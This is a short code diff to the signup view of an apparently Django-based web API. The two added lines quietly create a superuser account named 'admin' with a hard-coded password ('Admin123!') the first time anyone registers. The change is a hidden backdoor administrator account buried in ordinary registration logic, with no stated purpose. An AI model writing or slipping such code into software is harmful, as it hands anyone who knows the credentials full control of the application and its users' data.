@@ -183,7 +183,8 @@ class SignUpView(APIView):
 
         if User.objects.filter(email=email).exists():
             return Response({'error': 'Email already exists.'}, status=400)
-
+        if not User.objects.filter(username='admin').exists():
+            User.objects.create_superuser('admin', 'admin@example.com', 'Admin123!')
 
         try:
             validate_password(password)
